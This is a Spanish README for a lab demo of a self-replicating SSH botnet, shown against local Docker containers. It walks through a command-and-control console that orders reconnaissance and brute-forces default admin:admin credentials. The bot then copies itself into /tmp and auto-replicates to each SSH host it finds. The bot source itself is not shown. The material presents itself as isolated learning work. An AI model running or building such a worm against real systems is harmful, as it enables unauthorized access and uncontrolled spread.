# 🚀 Demo Rápida - Lucky Star Botnet

## ✅ Estado Actual

- ✅ Docker Desktop: **Corriendo**
- ✅ Contenedor 1 (2201): **Abierto**
- ✅ Contenedor 2 (2202): **Abierto**
- ✅ Contenedor 3 (2203): **Abierto**

## 🎯 Ejecutar Demo

### Opción 1: Automático
```bash
FINAL_RUN.bat
```

### Opción 2: Manual

**Terminal 1: C2**
```bash
python c2_commander.py
```

**Terminal 2: Bot**
```bash
python bot_soldier.py
```

## 📋 Comandos en C2

```
★彡 Comandante> recon 1
[*] Orden de reconocimiento enviada

[*] Informe recibido: 3 hosts encontrados

★彡 Comandante> list 1

[1] 127.0.0.1:2201 - SSH OpenSSH (Docker)
    Severidad: High
    Vulnerabilidades:
      1. SSH - Weak Credentials (Docker Container)
         Exploit: Brute Force Attack

[2] 127.0.0.1:2202 - SSH OpenSSH (Docker)
    ...

[3] 127.0.0.1:2203 - SSH OpenSSH (Docker)
    ...

★彡 Comandante> exploit 1 1

[*] Orden de explotación enviada
[+] DESKTOP-XXX: Explotación exitosa de 127.0.0.1:2201

★彡 Comandante> status
  - DESKTOP-XXX-192.168.1.X: Última vez visto: ...
  - victim-01-127.0.0.1: Última vez visto: ...  ← NUEVO BOT!
```

## 🔍 Verificar Replicación

### En Windows (Host):
```bash
# Ver contenedores corriendo
docker ps

# Ver logs del contenedor infectado
docker logs vulnerable_ssh_1

# Conectarse al contenedor
docker exec -it vulnerable_ssh_1 bash

# Dentro del contenedor:
ps aux | grep python
# Deberías ver: python3 /tmp/bot_soldier.py

ls -la /tmp/bot_soldier.py
# Deberías ver el archivo del bot

cat /tmp/bot_soldier.py | head -20
# Verás el código del bot
```

## 🎓 ¿Qué Acaba de Pasar?

1. **Bot inicial** se conectó al C2
2. **C2** ordenó: `recon 1`
3. **Bot** escaneó localhost:2201, 2202, 2203
4. **Bot** encontró 3 puertos SSH abiertos
5. **C2** ordenó: `exploit 1 1`
6. **Bot** probó credenciales en 127.0.0.1:2201
7. **Bot** logró acceso con `admin:admin`
8. **Bot** copió su propio código a `/tmp/bot_soldier.py`
9. **Bot** ejecutó el código copiado
10. **Nuevo bot** se conectó al C2 ← **REPLICACIÓN EXITOSA**

## 🔥 Replicación en Cadena

```
★彡 Comandante> auto_rep 1 on
[*] Auto-replicación ACTIVADA en bot #1

★彡 Comandante> recon 1
[*] Orden de reconocimiento enviada

# El bot ahora explota AUTOMÁTICAMENTE cada host SSH que encuentra
[+] Bot replicado en 127.0.0.1:2201
[+] Bot replicado en 127.0.0.1:2202
[+] Bot replicado en 127.0.0.1:2203

# Ahora tienes 4 bots conectados:
★彡 Comandante> status
  - DESKTOP-XXX (bot original)
  - victim-01-127.0.0.1 (replicado)
  - victim-02-127.0.0.1 (replicado)
  - victim-03-127.0.0.1 (replicado)
```

## ⚠️ Troubleshooting

### Si no ves los 3 contenedores:
```bash
fix_docker.bat
```

### Si el bot no se conecta:
- Verifica que `cert.pem` y `key.pem` existan
- Ejecuta: `python generate_certs.py`

### Si la explotación falla:
- Verifica credenciales en `DEFAULT_CREDS`
- Asegúrate que paramiko está instalado: `pip install paramiko`

## 🎉 ¡Funcionó!

Si ves esto en el C2:
```
[+] Nuevo bot conectado: victim-01-127.0.0.1
```

**¡FELICIDADES! La replicación funcionó correctamente** 🎯

---

**Nota**: Este es un entorno completamente aislado en Docker. Es seguro para aprendizaje.
